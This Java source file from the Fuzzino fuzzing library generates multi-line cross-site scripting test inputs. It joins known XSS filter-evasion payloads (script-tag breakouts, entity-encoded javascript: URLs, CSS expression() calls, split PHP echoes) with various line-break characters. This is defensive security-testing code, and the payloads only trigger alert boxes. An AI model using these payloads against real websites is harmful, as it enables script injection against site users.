//   Copyright 2012-2013 Fraunhofer FOKUS
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
package de.fraunhofer.fokus.fuzzing.fuzzino.heuristics.generators.string;

import java.util.List;

import de.fraunhofer.fokus.fuzzing.fuzzino.heuristics.FuzzingHeuristic;
import de.fraunhofer.fokus.fuzzing.fuzzino.request.StringSpecification;
import de.fraunhofer.fokus.fuzzing.fuzzino.request.StringType;

public class XSSMultipleLinesInputGenerator extends ComposedStringGenerator {

	public XSSMultipleLinesInputGenerator(StringSpecification stringSpec,long seed) {
		super(stringSpec, seed);
		this.owners.add(this);
		initHeuristics();
	}
	
	public XSSMultipleLinesInputGenerator(StringSpecification stringSpec,long seed, List<FuzzingHeuristic> owners) {
		super(stringSpec, seed, owners);
		this.owners.add(this);
		initHeuristics();
	}


	private void initHeuristics() {
		//TODO: maybe make the hardcoded javascript function call (alert) dynamic?
		ConcreteValuesGenerator lineBreakGenerator = new ConcreteValuesGenerator(stringSpec, seed, owners, 
			new Character((char) 0x000A).toString(),
			new Character((char) 0x000B).toString(),
			new Character((char) 0x000C).toString(),
			new Character((char) 0x000D).toString(),
			new Character((char) 0x000D).toString()+new Character((char) 0x000A).toString(),
			new Character((char) 0x0085).toString(),
			new Character((char) 0x2028).toString(),
			new Character((char) 0x2029).toString()
		);
		ConcreteValuesGenerator line1 = new ConcreteValuesGenerator(stringSpec, seed, owners, "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";");
		ConcreteValuesGenerator line2 = new ConcreteValuesGenerator(stringSpec, seed, owners, "alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--");
		ConcreteValuesGenerator line3 = new ConcreteValuesGenerator(stringSpec, seed, owners, "></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>");
		heuristics.add(new Combinator(stringSpec,seed,owners,line1,lineBreakGenerator,line2,lineBreakGenerator,line3));
		line1 = new ConcreteValuesGenerator(stringSpec, seed, owners, "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;");
		line2 = new ConcreteValuesGenerator(stringSpec, seed, owners, "&#39;&#88;&#83;&#83;&#39;&#41;>");
		heuristics.add(new Combinator(stringSpec,seed,owners,line1,lineBreakGenerator,line2));
		line1 = new ConcreteValuesGenerator(stringSpec, seed, owners, "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&");
		line2 = new ConcreteValuesGenerator(stringSpec, seed, owners, "#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>");
		heuristics.add(new Combinator(stringSpec,seed,owners,line1,lineBreakGenerator,line2));
		line1 = new ConcreteValuesGenerator(stringSpec, seed, owners, "exp/*<A STYLE='no\\xss:noxss(\"*//*\");");
		line2 = new ConcreteValuesGenerator(stringSpec, seed, owners, "xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>");
		heuristics.add(new Combinator(stringSpec,seed,owners,line1,lineBreakGenerator,line2));
		line1 = new ConcreteValuesGenerator(stringSpec, seed, owners, "<!--[if gte IE 4]>");
		line2 = new ConcreteValuesGenerator(stringSpec, seed, owners, " <SCRIPT>alert('XSS');</SCRIPT>");
		line3 = new ConcreteValuesGenerator(stringSpec, seed, owners, " <![endif]-->");
		heuristics.add(new Combinator(stringSpec,seed,owners,line1,lineBreakGenerator,line2,lineBreakGenerator,line3));
		line1 = new ConcreteValuesGenerator(stringSpec, seed, owners, "<? echo('<SCR)';");
		line2 = new ConcreteValuesGenerator(stringSpec, seed, owners, "echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>");
		heuristics.add(new Combinator(stringSpec,seed,owners,line1,lineBreakGenerator,line2));
		line1 = new ConcreteValuesGenerator(stringSpec, seed, owners, "<DIV STYLE=\"width:\"");
		line2 = new ConcreteValuesGenerator(stringSpec, seed, owners, "\"expression(alert('XSS'));\">");
		heuristics.add(new Combinator(stringSpec,seed,owners,line1,lineBreakGenerator,line2));

	}


	/**
	 * 
	 */
	private static final long serialVersionUID = 556638849065722783L;

	@Override
	public boolean canCreateValuesFor(StringSpecification stringSpec) {
		return stringSpec.getType() == StringType.XSS;
	}

	@Override
	public String getName() {
		return "XSSMultipleLinesInput";
	}

}
